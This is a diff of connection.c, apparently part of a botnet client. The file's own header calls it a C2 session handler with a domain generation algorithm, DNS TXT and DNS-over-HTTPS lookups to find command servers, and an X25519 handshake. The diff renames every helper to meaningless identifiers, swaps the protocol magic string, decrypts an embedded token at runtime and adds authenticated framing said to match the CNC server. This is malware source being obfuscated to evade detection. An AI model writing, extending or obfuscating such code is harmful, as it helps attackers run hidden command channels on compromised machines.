@@ -1,6 +1,6 @@
 /* connection.c — Encrypted TCP connection module (pure C, GCC 4.1.2 compatible)
  *
- * VPE2 handshake, DNS resolution (DoH / raw UDP), DGA, HTTP GET,
+ * EZF3 handshake, DNS resolution (DoH / raw UDP), DGA, HTTP GET,
  * C2 session handler (auth + command loop).
  */
 
@@ -10,16 +10,16 @@
    FORWARD DECLARATIONS / STATIC HELPERS
    ====================================================================== */
 
-static void set_socket_timeout(int fd, int sec);
+static void _Hh6mZ4r(int fd, int sec);
 static int  tcp_connect(const char *host, const char *port, int timeout_sec);
-static int  build_dns_query(const char *domain, uint16_t qtype, uint8_t *buf, size_t bufsz);
-static int  parse_dns_response(const uint8_t *resp, size_t resp_len, uint16_t qtype, strarr *out);
+static int  _FP6Wh5K(const char *domain, uint16_t qtype, uint8_t *buf, size_t bufsz);
+static int  _Hv5xT6G(const uint8_t *resp, size_t resp_len, uint16_t qtype, strarr *out);
 
 /* ======================================================================
-   set_socket_timeout — set SO_RCVTIMEO + SO_SNDTIMEO on a socket
+   _Hh6mZ4r — set SO_RCVTIMEO + SO_SNDTIMEO on a socket
    ====================================================================== */
 
-static void set_socket_timeout(int fd, int sec)
+static void _Hh6mZ4r(int fd, int sec)
 {
     struct timeval tv;
     tv.tv_sec  = sec;
@@ -45,7 +45,7 @@ static int tcp_connect(const char *host, const char *port, int timeout_sec)
 
     ret = getaddrinfo(host, port, &hints, &res);
     if (ret != 0) {
-        debug_log("getaddrinfo(%s:%s): %s", host, port, gai_strerror(ret));
+        _nS5PJ8Y("getaddrinfo(%s:%s): %s", host, port, gai_strerror(ret));
         return -1;
     }
 
@@ -106,10 +106,10 @@ static int tcp_connect(const char *host, const char *port, int timeout_sec)
 }
 
 /* ======================================================================
-   parse_address — split "host:port" into dstr components
+   gv4Kv3u — split "host:port" into dstr components
    ====================================================================== */
 
-int parse_address(const char *addr, dstr *host, dstr *port)
+int gv4Kv3u(const char *addr, dstr *host, dstr *port)
 {
     const char *colon;
 
@@ -144,41 +144,41 @@ int parse_address(const char *addr, dstr *host, dstr *port)
 }
 
 /* ======================================================================
-   vpn_connect — TCP connect + VPE2 encrypted handshake
+   hq4zK8c — TCP connect + EZF3 encrypted handshake
    X25519 forward secrecy + HMAC-SHA256 key derivation
    ====================================================================== */
 
-conn_t *vpn_connect(const char *host, const char *port)
+_EA8up4M *hq4zK8c(const char *host, const char *port)
 {
     int fd;
-    conn_t *c;
+    _EA8up4M *c;
     uint8_t client_nonce[32];
     uint8_t client_priv[32], client_pub[32];
     uint8_t server_nonce[32], server_pub[32];
-    uint8_t handshake_buf[4 + 32 + 32]; /* "VPE2" + nonce + x25519_pub */
+    uint8_t handshake_buf[4 + 32 + 32]; /* "EZF3" + nonce + x25519_pub */
     uint8_t shared_secret[32];
     uint8_t session_key[32], key_c2s[32], key_s2c[32], hmac_key[32];
     uint8_t ikm[96]; /* client_nonce || server_nonce || shared_secret */
     ssize_t n;
     size_t off;
 
-    debug_log("vpn_connect: connecting to %s:%s (VPE2)", host, port);
+    _nS5PJ8Y("hq4zK8c: connecting to %s:%s (EZF3)", host, port);
 
     fd = tcp_connect(host, port, 15);
     if (fd < 0) {
-        debug_log("vpn_connect: tcp_connect failed");
+        _nS5PJ8Y("hq4zK8c: tcp_connect failed");
         return NULL;
     }
 
-    set_socket_timeout(fd, 10);
+    _Hh6mZ4r(fd, 10);
 
     /* Generate client nonce + ephemeral X25519 keypair */
     urandom_bytes(client_nonce, 32);
     urandom_bytes(client_priv, 32);
-    x25519_scalarmult_base(client_pub, client_priv);
+    _go6pR4p(client_pub, client_priv);
 
-    /* Send "VPE2" + client_nonce + client_x25519_pub */
-    memcpy(handshake_buf, "VPE2", 4);
+    /* Send "EZF3" + client_nonce + client_x25519_pub */
+    memcpy(handshake_buf, "EZF3", 4);
     memcpy(handshake_buf + 4, client_nonce, 32);
     memcpy(handshake_buf + 36, client_pub, 32);
 
@@ -209,32 +209,36 @@ conn_t *vpn_connect(const char *host, const char *port)
     }
 
     /* Compute X25519 shared secret */
-    x25519_scalarmult(shared_secret, client_priv, server_pub);
+    _aw4Ma4u(shared_secret, client_priv, server_pub);
 
-    /* Derive session key: HMAC-SHA256(SYNC_TOKEN, client_nonce || server_nonce || shared_secret) */
+    /* Derive session key: HMAC-SHA256(sync_token, client_nonce || server_nonce || shared_secret) */
     memcpy(ikm, client_nonce, 32);
     memcpy(ikm + 32, server_nonce, 32);
     memcpy(ikm + 64, shared_secret, 32);
-    hmac_sha256((const uint8_t *)SYNC_TOKEN, strlen(SYNC_TOKEN), ikm, 96, session_key);
+    DS4RR2W(); /* ensure sync token is decrypted */
+    _no3nm7v((const uint8_t *)ds_cstr(&_Lv3Qk8T), ds_len(&_Lv3Qk8T), ikm, 96, session_key);
 
     /* Derive directional keys + HMAC key */
-    hmac_sha256(session_key, 32, (const uint8_t *)"c2s", 3, key_c2s);
-    hmac_sha256(session_key, 32, (const uint8_t *)"s2c", 3, key_s2c);
-    hmac_sha256(session_key, 32, (const uint8_t *)"hmac", 4, hmac_key);
+    _no3nm7v(session_key, 32, (const uint8_t *)"c2s", 3, key_c2s);
+    _no3nm7v(session_key, 32, (const uint8_t *)"s2c", 3, key_s2c);
+    _no3nm7v(session_key, 32, (const uint8_t *)"hmac", 4, hmac_key);
 
-    /* Allocate conn_t */
-    c = (conn_t *)malloc(sizeof(conn_t));
+    /* Allocate _EA8up4M */
+    c = (_EA8up4M *)malloc(sizeof(_EA8up4M));
     if (!c) {
         close(fd);
         goto cleanup_early;
     }
 
-    c->fd    = fd;
-    c->valid = 1;
+    c->fd      = fd;
+    c->valid   = 1;
+    c->rbuf    = NULL;
+    c->rbuf_len = 0;
+    c->rbuf_pos = 0;
 
     /* Init ciphers: send = c2s, recv = s2c */
-    cipher_init(&c->send_cipher, key_c2s);
-    cipher_init(&c->recv_cipher, key_s2c);
+    _BV3cU8N(&c->send_cipher, key_c2s);
+    _BV3cU8N(&c->recv_cipher, key_s2c);
     memcpy(c->hmac_key, hmac_key, 32);
 
     /* Zero all sensitive locals */
@@ -249,7 +253,7 @@ conn_t *vpn_connect(const char *host, const char *port)
     explicit_bzero(ikm, 96);
     explicit_bzero(handshake_buf, sizeof(handshake_buf));
 
-    debug_log("vpn_connect: VPE2 handshake complete (X25519 + HMAC-SHA256)");
+    _nS5PJ8Y("hq4zK8c: EZF3 handshake complete (X25519 + HMAC-SHA256)");
     return c;
 
 cleanup_early:
@@ -263,162 +267,225 @@ cleanup_early:
 }
 
 /* ======================================================================
-   vpn_close — close fd, free conn_t
+   ZR8pH4D — close fd, free _EA8up4M
    ====================================================================== */
 
-void vpn_close(conn_t *c)
+void ZR8pH4D(_EA8up4M *c)
 {
     if (!c) return;
     if (c->fd >= 0) close(c->fd);
     c->valid = 0;
-    /* Zero all key material before freeing */
     explicit_bzero(&c->send_cipher, sizeof(c->send_cipher));
     explicit_bzero(&c->recv_cipher, sizeof(c->recv_cipher));
     explicit_bzero(c->hmac_key, 32);
+    free(c->rbuf);
+    c->rbuf = NULL;
     free(c);
 }
 
 /* ======================================================================
-   vpn_write — encrypt + write to fd
+   Jf8pY4F — authenticated frame write
+   Wire: [2-byte BE frameLen][ChaCha20(payload || HMAC-SHA256(hmac_key,payload)[0:16])]
+   Matches CNC WriteFrame exactly.
    ====================================================================== */
 
-void vpn_write(conn_t *c, const char *data, size_t len)
+void Jf8pY4F(_EA8up4M *c, const char *data, size_t len)
 {
-    uint8_t *tmp;
+    uint8_t tag[32];
+    uint8_t *frame;
+    size_t frame_len;
+    uint8_t header[2];
     size_t off;
     ssize_t n;
 
     if (!c || !c->valid || c->fd < 0 || len == 0) return;
+    if (len > 0xFFFF - 16) return; /* frame too large */
 
-    tmp = (uint8_t *)malloc(len);
-    if (!tmp) return;
-    memcpy(tmp, data, len);
+    /* Compute HMAC-SHA256(hmac_key, payload), keep first 16 bytes */
+    _no3nm7v(c->hmac_key, 32, (const uint8_t *)data, len, tag);
 
-    cipher_crypt(&c->send_cipher, tmp, len);
+    frame_len = len + 16;
+    frame = (uint8_t *)malloc(frame_len);
+    if (!frame) return;
 
+    memcpy(frame, data, len);
+    memcpy(frame + len, tag, 16);
+    explicit_bzero(tag, 32);
+
+    /* Encrypt payload + tag in-place */
+    if (_gF6Fb8W(&c->send_cipher, frame, frame_len) < 0) {
+        free(frame);
+        c->valid = 0;
+        return;
+    }
+
+    /* Write 2-byte big-endian frame length */
+    header[0] = (uint8_t)(frame_len >> 8);
+    header[1] = (uint8_t)(frame_len & 0xFF);
     off = 0;
-    while (off < len) {
-        n = write(c->fd, tmp + off, len - off);
-        if (n <= 0) {
-            c->valid = 0;
-            break;
-        }
+    while (off < 2) {
+        n = write(c->fd, header + off, 2 - off);
+        if (n <= 0) { c->valid = 0; free(frame); return; }
         off += (size_t)n;
     }
 
-    free(tmp);
+    /* Write encrypted frame */
+    off = 0;
+    while (off < frame_len) {
+        n = write(c->fd, frame + off, frame_len - off);
+        if (n <= 0) { c->valid = 0; break; }
+        off += (size_t)n;
+    }
+
+    free(frame);
 }
 
 /* ======================================================================
-   vpn_writes — convenience: vpn_write(c, str, strlen(str))
+   Ng2ZR5y — convenience: Jf8pY4F(c, str, strlen(str))
    ====================================================================== */
 
-void vpn_writes(conn_t *c, const char *str)
+void Ng2ZR5y(_EA8up4M *c, const char *str)
 {
-    if (str) vpn_write(c, str, strlen(str));
+    if (str) Jf8pY4F(c, str, strlen(str));
 }
 
 /* ======================================================================
-   vpn_read_line — read byte-by-byte, decrypt, accumulate until '\n'
+   _read_frame — read one authenticated frame from the CNC into c->rbuf.
+   Wire: [2-byte BE frameLen][ChaCha20(payload || HMAC-SHA256(hmac_key,payload)[0:16])]
+   Matches CNC WriteFrame exactly.
    ====================================================================== */
 
-dstr vpn_read_line(conn_t *c, int timeout_sec)
+static int _read_frame(_EA8up4M *c, int timeout_sec)
 {
-    dstr line;
+    uint8_t header[2];
+    uint8_t *frame;
+    size_t frame_len, payload_len;
+    size_t off;
+    ssize_t n;
+    uint8_t expected_tag[32];
+    int mismatch;
+    size_t i;
     struct pollfd pfd;
     int ret;
+
+    if (!c || !c->valid || c->fd < 0) return -1;
+
+    /* Poll for first byte with caller's timeout */
+    pfd.fd = c->fd;
+    pfd.events = POLLIN;
+    for (;;) {
+        ret = poll(&pfd, 1, timeout_sec * 1000);
+        if (ret < 0) {
+            if (errno == EINTR) continue;
+            c->valid = 0;
+            return -1;
+        }
+        if (ret == 0) return -1; /* timeout */
+        break;
+    }
+
+    /* Read 2-byte big-endian frame length */
+    off = 0;
+    while (off < 2) {
+        n = read(c->fd, header + off, 2 - off);
+        if (n < 0) { if (errno == EINTR) continue; c->valid = 0; return -1; }
+        if (n == 0) { c->valid = 0; return -1; }
+        off += (size_t)n;
+    }
+
+    frame_len = ((size_t)header[0] << 8) | header[1];
+    if (frame_len < 16 || frame_len > 65551) { c->valid = 0; return -1; }
+
+    frame = (uint8_t *)malloc(frame_len);
+    if (!frame) { c->valid = 0; return -1; }
+
+    /* Read the complete encrypted frame body */
+    off = 0;
+    while (off < frame_len) {
+        n = read(c->fd, frame + off, frame_len - off);
+        if (n < 0) { if (errno == EINTR) continue; c->valid = 0; free(frame); return -1; }
+        if (n == 0) { c->valid = 0; free(frame); return -1; }
+        off += (size_t)n;
+    }
+
+    /* Decrypt frame body */
+    if (_gF6Fb8W(&c->recv_cipher, frame, frame_len) < 0) {
+        c->valid = 0;
+        free(frame);
+        return -1;
+    }
+
+    payload_len = frame_len - 16;
+
+    /* Verify HMAC-SHA256(hmac_key, payload)[0:16] */
+    _no3nm7v(c->hmac_key, 32, frame, payload_len, expected_tag);
+    mismatch = 0;
+    for (i = 0; i < 16; i++) mismatch |= frame[payload_len + i] ^ expected_tag[i];
+    explicit_bzero(expected_tag, 32);
+    if (mismatch) { c->valid = 0; free(frame); return -1; }
+
+    /* Store payload in receive buffer (truncate the 16-byte tag) */
+    free(c->rbuf);
+    c->rbuf     = frame;
+    c->rbuf_len = payload_len;
+    c->rbuf_pos = 0;
+    return 0;
+}
+
+/* ======================================================================
+   Un4Ss4D — accumulate bytes from the authenticated frame buffer until '\n'.
+   Delegates to nb2Fg4N so all reads go through the HMAC-verified frame path.
+   ====================================================================== */
+
+dstr Un4Ss4D(_EA8up4M *c, int timeout_sec)
+{
+    dstr line;
+    int b;
 
     ds_init(&line);
     if (!c || !c->valid || c->fd < 0) return line;
 
-    pfd.fd     = c->fd;
-    pfd.events = POLLIN;
-
     for (;;) {
-        uint8_t byte;
-        ssize_t n;
-
-        ret = poll(&pfd, 1, timeout_sec * 1000);
-        if (ret < 0) {
-            if (errno == EINTR) continue; /* signal interrupted, retry */
-            break;
-        }
-        if (ret == 0) {
-            /* timeout */
-            break;
-        }
-
-        n = read(c->fd, &byte, 1);
-        if (n < 0) {
-            if (errno == EINTR) continue; /* signal interrupted, retry */
-            c->valid = 0;
-            break;
-        }
-        if (n == 0) {
-            c->valid = 0;
-            break;
-        }
-
-        cipher_crypt(&c->recv_cipher, &byte, 1);
-
-        if (byte == '\n') break;
-        ds_catc(&line, (char)byte);
-    }
-
-    /* strip trailing \r */
-    while (ds_len(&line) > 0 && ds_back(&line) == '\r') {
-        ds_pop(&line);
+        b = nb2Fg4N(c, timeout_sec);
+        if (b < 0) break;
+        if (b == '\n') break;
+        if (b != '\r') ds_catc(&line, (char)b);
     }
 
     return line;
 }
 
 /* ======================================================================
-   vpn_read_byte — read + decrypt one byte, returns byte or -1 on error/timeout
+   nb2Fg4N — return one byte from the authenticated frame receive buffer.
+   Refills the buffer by reading and verifying a new frame when empty.
    ====================================================================== */
 
-int vpn_read_byte(conn_t *c, int timeout_sec)
+int nb2Fg4N(_EA8up4M *c, int timeout_sec)
 {
-    struct pollfd pfd;
-    uint8_t byte;
-    ssize_t n;
-    int ret;
-
     if (!c || !c->valid || c->fd < 0) return -1;
 
-    pfd.fd     = c->fd;
-    pfd.events = POLLIN;
+    /* Serve from buffer if available */
+    if (c->rbuf && c->rbuf_pos < c->rbuf_len)
+        return (int)(unsigned char)c->rbuf[c->rbuf_pos++];
 
-    for (;;) {
-        ret = poll(&pfd, 1, timeout_sec * 1000);
-        if (ret < 0) {
-            if (errno == EINTR) continue;
-            return -1;
-        }
-        if (ret == 0) return -1; /* timeout */
+    /* Buffer exhausted — read and authenticate a new frame */
+    if (_read_frame(c, timeout_sec) < 0) return -1;
 
-        n = read(c->fd, &byte, 1);
-        if (n < 0) {
-            if (errno == EINTR) continue;
-            c->valid = 0;
-            return -1;
-        }
-        if (n == 0) { c->valid = 0; return -1; }
+    if (c->rbuf_pos < c->rbuf_len)
+        return (int)(unsigned char)c->rbuf[c->rbuf_pos++];
 
-        cipher_crypt(&c->recv_cipher, &byte, 1);
-        return (int)byte;
-    }
+    return -1;
 }
 
 /* ======================================================================
-   vpn_read_exact — read + decrypt exactly n bytes, returns 0 on success, -1 on error
+   AF6jH4z — read + decrypt exactly n bytes, returns 0 on success, -1 on error
    ====================================================================== */
 
-int vpn_read_exact(conn_t *c, void *buf, size_t n, int timeout_sec)
+int AF6jH4z(_EA8up4M *c, void *buf, size_t n, int timeout_sec)
 {
     size_t got = 0;
     while (got < n) {
-        int b = vpn_read_byte(c, timeout_sec);
+        int b = nb2Fg4N(c, timeout_sec);
         if (b < 0) return -1;
         ((uint8_t *)buf)[got++] = (uint8_t)b;
     }
@@ -426,10 +493,10 @@ int vpn_read_exact(conn_t *c, void *buf, size_t n, int timeout_sec)
 }
 
 /* ======================================================================
-   is_valid_hostname — quick check (letters, digits, -, .)
+   SZ2yL5g — quick check (letters, digits, -, .)
    ====================================================================== */
 
-int is_valid_hostname(const char *h)
+int SZ2yL5g(const char *h)
 {
     size_t len, i;
     int has_dot;
@@ -453,11 +520,11 @@ int is_valid_hostname(const char *h)
 }
 
 /* ======================================================================
-   parse_txt_addresses — split TXT data into "host:port" entries
+   kS6pU7n — split TXT data into "host:port" entries
    Expects comma-separated or newline-separated address list.
    ====================================================================== */
 
-strarr parse_txt_addresses(const char *data)
+strarr kS6pU7n(const char *data)
 {
     strarr result;
     const char *p;
@@ -494,12 +561,12 @@ strarr parse_txt_addresses(const char *data)
 }
 
 /* ======================================================================
-   parse_txt_ips — extract plain IPv4 addresses from TXT record data.
+   Vc2mZ5Q — extract plain IPv4 addresses from TXT record data.
    Splits on comma, semicolon, space, newline. Validates each token
    with inet_pton so only real IPs are returned.
    ====================================================================== */
 
-strarr parse_txt_ips(const char *data)
+strarr Vc2mZ5Q(const char *data)
 {
     strarr result;
     const char *p;
@@ -539,11 +606,11 @@ strarr parse_txt_ips(const char *data)
 }
 
 /* ======================================================================
-   dns_txt_resolve_ips — query TXT record for domain, return parsed IPs.
-   Tries each resolver in g_resolver_pool via raw UDP.
+   mQ2Yw7j — query TXT record for domain, return parsed IPs.
+   Tries each resolver in _fx8Fz7F via raw UDP.
    ====================================================================== */
 
-strarr dns_txt_resolve_ips(const char *domain)
+strarr mQ2Yw7j(const char *domain)
 {
     strarr result;
     size_t i;
@@ -551,12 +618,12 @@ strarr dns_txt_resolve_ips(const char *domain)
     sa_init(&result);
     if (!domain || *domain == '\0') return result;
 
-    for (i = 0; i < sa_count(&g_resolver_pool); i++) {
-        strarr txts = dns_txt_query(domain, sa_get(&g_resolver_pool, i));
+    for (i = 0; i < sa_count(&_fx8Fz7F); i++) {
+        strarr txts = Dc6Mh8n(domain, sa_get(&_fx8Fz7F, i));
         if (sa_count(&txts) > 0) {
             size_t j;
             for (j = 0; j < sa_count(&txts); j++) {
-                strarr ips = parse_txt_ips(sa_get(&txts, j));
+                strarr ips = Vc2mZ5Q(sa_get(&txts, j));
                 sa_insert(&result, &ips);
                 sa_free(&ips);
             }
@@ -570,10 +637,10 @@ strarr dns_txt_resolve_ips(const char *domain)
 }
 
 /* ======================================================================
-   DNS WIRE FORMAT — build_dns_query / parse_dns_response
+   DNS WIRE FORMAT — _FP6Wh5K / _Hv5xT6G
    ====================================================================== */
 
-static int build_dns_query(const char *domain, uint16_t qtype, uint8_t *buf, size_t bufsz)
+static int _FP6Wh5K(const char *domain, uint16_t qtype, uint8_t *buf, size_t bufsz)
 {
     /* Build a raw DNS query packet for the given domain and query type.
      * Returns total packet length, or -1 on error. */
@@ -623,7 +690,7 @@ static int build_dns_query(const char *domain, uint16_t qtype, uint8_t *buf, siz
 }
 
 /* skip a DNS name (handles compression pointers) */
-static int dns_skip_name(const uint8_t *pkt, size_t pkt_len, size_t off)
+static int _cU2iD2p(const uint8_t *pkt, size_t pkt_len, size_t off)
 {
     int jumps = 0;
     while (off < pkt_len) {
@@ -640,7 +707,7 @@ static int dns_skip_name(const uint8_t *pkt, size_t pkt_len, size_t off)
     return -1;
 }
 
-static int parse_dns_response(const uint8_t *resp, size_t resp_len, uint16_t qtype, strarr *out)
+static int _Hv5xT6G(const uint8_t *resp, size_t resp_len, uint16_t qtype, strarr *out)
 {
     uint16_t qdcount, ancount;
     size_t off;
@@ -655,7 +722,7 @@ static int parse_dns_response(const uint8_t *resp, size_t resp_len, uint16_t qty
 
     /* skip question section */
     for (i = 0; i < (int)qdcount; i++) {
-        int end = dns_skip_name(resp, resp_len, off);
+        int end = _cU2iD2p(resp, resp_len, off);
         if (end < 0) return -1;
         off = (size_t)end + 4; /* skip QTYPE + QCLASS */
         if (off > resp_len) return -1;
@@ -666,7 +733,7 @@ static int parse_dns_response(const uint8_t *resp, size_t resp_len, uint16_t qty
         uint16_t rtype, rclass, rdlen;
         int end;
 
-        end = dns_skip_name(resp, resp_len, off);
+        end = _cU2iD2p(resp, resp_len, off);
         if (end < 0) return -1;
         off = (size_t)end;
 
@@ -712,10 +779,10 @@ static int parse_dns_response(const uint8_t *resp, size_t resp_len, uint16_t qty
 }
 
 /* ======================================================================
-   dns_txt_query — raw UDP DNS TXT query to a specific server
+   Dc6Mh8n — raw UDP DNS TXT query to a specific server
    ====================================================================== */
 
-strarr dns_txt_query(const char *domain, const char *server)
+strarr Dc6Mh8n(const char *domain, const char *server)
 {
     strarr result;
     uint8_t qbuf[512], rbuf[4096];
@@ -730,12 +797,12 @@ strarr dns_txt_query(const char *domain, const char *server)
     /* parse server address */
     ds_init(&srv_host);
     ds_init(&srv_port);
-    if (!parse_address(server, &srv_host, &srv_port)) {
+    if (!gv4Kv3u(server, &srv_host, &srv_port)) {
         ds_set(&srv_host, server);
         ds_set(&srv_port, "53");
     }
 
-    qlen = build_dns_query(domain, 16 /* TXT */, qbuf, sizeof(qbuf));
+    qlen = _FP6Wh5K(domain, 16 /* TXT */, qbuf, sizeof(qbuf));
     if (qlen < 0) {
         ds_free(&srv_host);
         ds_free(&srv_port);
@@ -754,13 +821,13 @@ strarr dns_txt_query(const char *domain, const char *server)
     sa.sin_port   = htons((uint16_t)atoi(ds_cstr(&srv_port)));
     inet_pton(AF_INET, ds_cstr(&srv_host), &sa.sin_addr);
 
-    debug_log("dns_txt_query: sending %d bytes to %s:%s",
+    _nS5PJ8Y("Dc6Mh8n: sending %d bytes to %s:%s",
               qlen, ds_cstr(&srv_host), ds_cstr(&srv_port));
 
     ret = (int)sendto(fd, qbuf, (size_t)qlen, 0,
                       (struct sockaddr *)&sa, sizeof(sa));
     if (ret <= 0) {
-        debug_log("dns_txt_query: sendto failed: %s", strerror(errno));
+        _nS5PJ8Y("Dc6Mh8n: sendto failed: %s", strerror(errno));
         close(fd);
         ds_free(&srv_host);
         ds_free(&srv_port);
@@ -772,13 +839,13 @@ strarr dns_txt_query(const char *domain, const char *server)
     ret = poll(&pfd, 1, 5000);
     if (ret > 0) {
         rlen = recvfrom(fd, rbuf, sizeof(rbuf), 0, NULL, NULL);
-        debug_log("dns_txt_query: recvfrom returned %zd bytes", rlen);
+        _nS5PJ8Y("Dc6Mh8n: recvfrom returned %zd bytes", rlen);
         if (rlen > 0) {
-            parse_dns_response(rbuf, (size_t)rlen, 16, &result);
-            debug_log("dns_txt_query: parsed %zu TXT records", sa_count(&result));
+            _Hv5xT6G(rbuf, (size_t)rlen, 16, &result);
+            _nS5PJ8Y("Dc6Mh8n: parsed %zu TXT records", sa_count(&result));
         }
     } else {
-        debug_log("dns_txt_query: poll timeout/error (ret=%d)", ret);
+        _nS5PJ8Y("Dc6Mh8n: poll timeout/error (ret=%d)", ret);
     }
 
     close(fd);
@@ -788,20 +855,20 @@ strarr dns_txt_query(const char *domain, const char *server)
 }
 
 /* ======================================================================
-   palkia — DNS TXT lookup via system resolvers (iterates g_resolver_pool)
+   LF5UQ4v — DNS TXT lookup via system resolvers (iterates _fx8Fz7F)
    ====================================================================== */
 
-strarr palkia(const char *domain)
+strarr LF5UQ4v(const char *domain)
 {
     strarr result;
     size_t i;
 
     sa_init(&result);
 
-    debug_log("palkia: resolver_pool has %zu entries", sa_count(&g_resolver_pool));
-    for (i = 0; i < sa_count(&g_resolver_pool); i++) {
-        debug_log("palkia: trying resolver[%zu] = '%s'", i, sa_get(&g_resolver_pool, i));
-        strarr r = dns_txt_query(domain, sa_get(&g_resolver_pool, i));
+    _nS5PJ8Y("LF5UQ4v: resolver_pool has %zu entries", sa_count(&_fx8Fz7F));
+    for (i = 0; i < sa_count(&_fx8Fz7F); i++) {
+        _nS5PJ8Y("LF5UQ4v: trying resolver[%zu] = '%s'", i, sa_get(&_fx8Fz7F, i));
+        strarr r = Dc6Mh8n(domain, sa_get(&_fx8Fz7F, i));
         if (sa_count(&r) > 0) {
             sa_insert(&result, &r);
             sa_free(&r);
@@ -814,19 +881,19 @@ strarr palkia(const char *domain)
 }
 
 /* ======================================================================
-   darkrai — DNS TXT lookup via DoH (DNS-over-HTTPS JSON API)
-   Uses g_doh_servers and g_doh_fallback lists.
+   Go3xC6n — DNS TXT lookup via DoH (DNS-over-HTTPS JSON API)
+   Uses _fq5Hh7H and _GT2zC6e lists.
    ====================================================================== */
 
-strarr darkrai(const char *domain)
+strarr Go3xC6n(const char *domain)
 {
     strarr result;
     strarr *pools[2];
     int p;
 
     sa_init(&result);
-    pools[0] = &g_doh_servers;
-    pools[1] = &g_doh_fallback;
+    pools[0] = &_fq5Hh7H;
+    pools[1] = &_GT2zC6e;
 
     for (p = 0; p < 2; p++) {
         size_t i;
@@ -840,7 +907,7 @@ strarr darkrai(const char *domain)
             ds_cat(&url, domain);
             ds_cat(&url, "&type=TXT");
 
-            body = http_get(ds_cstr(&url), 10);
+            body = eS2nM4J(ds_cstr(&url), 10);
             ds_free(&url);
 
             if (ds_len(&body) > 0) {
@@ -888,18 +955,18 @@ strarr darkrai(const char *domain)
 }
 
 /* ======================================================================
-   rayquaza — resolve domain via DoH, return first A record IP
+   DR4Wt6N — resolve domain via DoH, return first A record IP
    ====================================================================== */
 
-dstr rayquaza(const char *domain)
+dstr DR4Wt6N(const char *domain)
 {
     dstr ip;
     strarr *pools[2];
     int p;
 
     ds_init(&ip);
-    pools[0] = &g_doh_servers;
-    pools[1] = &g_doh_fallback;
+    pools[0] = &_fq5Hh7H;
+    pools[1] = &_GT2zC6e;
 
     for (p = 0; p < 2; p++) {
         size_t i;
@@ -913,7 +980,7 @@ dstr rayquaza(const char *domain)
             ds_cat(&url, domain);
             ds_cat(&url, "&type=A");
 
-            body = http_get(ds_cstr(&url), 10);
+            body = eS2nM4J(ds_cstr(&url), 10);
             ds_free(&url);
 
             if (ds_len(&body) == 0) {
@@ -959,10 +1026,10 @@ dstr rayquaza(const char *domain)
 }
 
 /* ======================================================================
-   http_get — plain HTTP GET (no HTTPS). Returns body as dstr.
+   eS2nM4J — plain HTTP GET (no HTTPS). Returns body as dstr.
    ====================================================================== */
 
-dstr http_get(const char *url, int timeout_sec)
+dstr eS2nM4J(const char *url, int timeout_sec)
 {
     dstr result;
     dstr host_str, port_str, path_str;
@@ -982,7 +1049,7 @@ dstr http_get(const char *url, int timeout_sec)
     if (strncmp(p, "http://", 7) == 0) {
         p += 7;
     } else if (strncmp(p, "https://", 8) == 0) {
-        /* we don't support https in http_get */
+        /* we don't support https in eS2nM4J */
         return result;
     }
 
@@ -1026,7 +1093,7 @@ dstr http_get(const char *url, int timeout_sec)
         return result;
     }
 
-    set_socket_timeout(fd, timeout_sec);
+    _Hh6mZ4r(fd, timeout_sec);
 
     /* build HTTP request */
     ds_init(&req);
@@ -1035,8 +1102,8 @@ dstr http_get(const char *url, int timeout_sec)
     ds_cat(&req, " HTTP/1.0\r\nHost: ");
     ds_catds(&req, &host_str);
     ds_cat(&req, "\r\nAccept: ");
-    if (ds_len(&g_dns_json_accept) > 0) {
-        ds_catds(&req, &g_dns_json_accept);
+    if (ds_len(&_so3eq8T) > 0) {
+        ds_catds(&req, &_so3eq8T);
     } else {
         ds_cat(&req, "*/*");
     }
@@ -1081,11 +1148,11 @@ dstr http_get(const char *url, int timeout_sec)
 }
 
 /* ======================================================================
-   expand_ip_ports — pair an IP with a comma-separated port string.
+   _TL7fj2H — pair an IP with a comma-separated port string.
    Pushes "ip:p1", "ip:p2", ... into result.
    ====================================================================== */
 
-static void expand_ip_ports(strarr *result, const char *ip, const char *ports)
+static void _TL7fj2H(strarr *result, const char *ip, const char *ports)
 {
     const char *pp;
     dstr tok;
@@ -1125,11 +1192,11 @@ static void expand_ip_ports(strarr *result, const char *ip, const char *ports)
 }
 
 /* ======================================================================
-   resolve_one — resolve a "decoded" config entry to addresses.
+   Fc7FE8v — resolve a "decoded" config entry to addresses.
    Tries: direct "host:port", DNS TXT fallback, DoH fallback.
    ====================================================================== */
 
-strarr resolve_one(const char *decoded)
+strarr Fc7FE8v(const char *decoded)
 {
     strarr result;
     int is_ip = 0;
@@ -1145,13 +1212,13 @@ strarr resolve_one(const char *decoded)
     /* parse host:port(s) if present — port may be comma-separated */
     if (strchr(decoded, ':')) {
         dstr h, p;
-        if (parse_address(decoded, &h, &p)) {
+        if (gv4Kv3u(decoded, &h, &p)) {
             struct in_addr tmp;
             if (inet_pton(AF_INET, ds_cstr(&h), &tmp) == 1) {
                 /* direct IP:port(s) — expand comma-separated ports */
                 is_ip = 1;
-                expand_ip_ports(&result, ds_cstr(&h), ds_cstr(&p));
-            } else if (is_valid_hostname(ds_cstr(&h))) {
+                _TL7fj2H(&result, ds_cstr(&h), ds_cstr(&p));
+            } else if (SZ2yL5g(ds_cstr(&h))) {
                 /* hostname — extract for TXT lookup first */
                 ds_set(&txt_domain, ds_cstr(&h));
                 ds_set(&cfg_port, ds_cstr(&p));
@@ -1167,23 +1234,23 @@ strarr resolve_one(const char *decoded)
         const char *domain = ds_len(&txt_domain) > 0 ? ds_cstr(&txt_domain) : decoded;
 
         /* try DNS TXT via system resolvers */
-        debug_log("resolve_one: TXT query for %s", domain);
+        _nS5PJ8Y("Fc7FE8v: TXT query for %s", domain);
         {
-            strarr dns = palkia(domain);
+            strarr dns = LF5UQ4v(domain);
             if (sa_count(&dns) > 0) {
                 size_t i;
                 for (i = 0; i < sa_count(&dns); i++) {
                     /* first try host:port format */
-                    strarr addrs = parse_txt_addresses(sa_get(&dns, i));
+                    strarr addrs = kS6pU7n(sa_get(&dns, i));
                     if (sa_count(&addrs) > 0) {
                         sa_insert(&result, &addrs);
                     } else {
                         /* try bare IPs — pair with cfg_port (may be multi-port) */
-                        strarr ips = parse_txt_ips(sa_get(&dns, i));
+                        strarr ips = Vc2mZ5Q(sa_get(&dns, i));
                         size_t j;
                         const char *pstr = ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : "443";
                         for (j = 0; j < sa_count(&ips); j++) {
-                            expand_ip_ports(&result, sa_get(&ips, j), pstr);
+                            _TL7fj2H(&result, sa_get(&ips, j), pstr);
                         }
                         sa_free(&ips);
                     }
@@ -1196,19 +1263,19 @@ strarr resolve_one(const char *decoded)
 
